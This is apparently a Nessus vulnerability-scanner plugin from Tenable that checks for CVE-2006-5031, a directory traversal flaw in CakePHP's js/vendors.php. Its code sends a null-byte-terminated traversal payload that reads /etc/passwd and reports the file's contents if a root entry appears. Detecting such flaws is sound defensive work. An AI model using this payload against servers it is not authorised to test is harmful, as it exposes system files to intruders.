#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a
directory traversal attack. 

Description :

The remote host is running CakePHP, an open-source rapid development
framework for PHP. 

The version of CakePHP on the remote host allows directory traversal
sequences in the 'file' parameter of the 'js/vendors.php' script.  An
unauthenticated attacker may be able to leverage this flaw to view
arbitrary files on the remote host subject to the privileges of the
web server user id. 

See also :

http://www.gulftech.org/?node=research&article_id=00114-09212006
https://trac.cakephp.org/ticket/1429
http://cakeforge.org/frs/shownotes.php?group_id=23&release_id=134

Solution :

Upgrade to CakePHP version 1.1.8.3544 or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description)
{
  script_id(22448);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-5031");
  script_bugtraq_id(20150);

  script_name(english:"CakePHP file Parameter Directory Traversal Vulnerability");
  script_summary(english:"Tries to read a local file with CakePHP");

  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/js/vendors.php?",
      "file=", file, "%00nessus.js"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        desc,
        "\n\n",
       "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}

